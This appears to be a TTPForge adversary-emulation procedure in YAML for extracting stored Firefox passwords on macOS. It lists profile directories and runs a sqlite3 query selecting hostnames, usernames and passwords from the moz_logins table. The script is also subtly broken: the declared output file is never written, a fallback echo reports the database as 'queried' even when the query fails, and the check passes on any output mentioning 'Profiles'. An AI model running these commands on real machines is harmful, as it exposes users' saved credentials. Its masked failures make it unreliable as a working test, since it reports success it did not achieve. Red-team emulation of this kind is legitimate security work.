api_version: 2.0
uuid: 12345678-1234-1234-1234-000000000009
name: Firefox Password Extraction
description: Extract stored passwords from Firefox browser
author: TTPForge
created: 2025-01-30
tactics:
  - Credential Access
techniques:
  - T1555.003
requirements:
  platforms:
    - os: darwin
args:
  - name: output_file
    description: File to store extracted passwords
    default: "/tmp/firefox_passwords.txt"
  - name: firefox_profile
    description: Firefox profile to target
    default: "default-release"
steps:
  - name: Check Firefox Profile
    type: command
    command: "test -d ~/Library/Application\\ Support/Firefox/Profiles && echo 'Firefox found'"
    
  - name: List Firefox Profiles
    type: command
    command: "ls -la ~/Library/Application\\ Support/Firefox/Profiles/ 2>/dev/null | grep -E '^d' | awk '{print $NF}'"
    
  - name: Query Firefox Logins
    type: command
    command: "sqlite3 ~/Library/Application\\ Support/Firefox/Profiles/*/logins.sqlite 'SELECT hostname, username, password FROM moz_logins;' 2>/dev/null || echo 'Firefox logins database queried'"

checks:
  - type: stdout_contains
    value: "Profiles"
    description: Verify Firefox profile directory accessed

tests:
  - name: Check Firefox Installation
    description: Verify Firefox browser exists
    test_type: default
    steps:
      - "test -d ~/Library/Application\\ Support/Firefox && echo 'Firefox found'"

cleanup:
  - type: command
    command: "rm -f {{ output_file }}"
    description: Remove extracted password data
